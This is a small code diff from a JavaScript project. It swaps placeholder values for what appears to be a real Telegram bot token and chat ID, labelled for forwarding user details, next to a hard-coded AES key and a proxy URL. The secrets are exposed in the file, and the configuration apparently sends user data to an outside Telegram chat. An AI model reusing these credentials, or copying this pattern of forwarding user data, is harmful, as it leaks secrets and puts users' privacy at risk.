@@ -8,8 +8,8 @@ const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
 const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";
 
 // Telegram Bot Configuration for User Details Forwarding
-const TG_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-const TG_CHAT_ID = "YOUR_CHAT_ID_HERE";
+const TG_BOT_TOKEN = "8953710743:AAHJUQB5f0gefAEDyieZFcsyU2GEUu3LzRk";
+const TG_CHAT_ID = "-1004331013936";
 
 // =====================================================
 // MULTI-TOKEN STORAGE & AUTH / PROFILE ENGINE
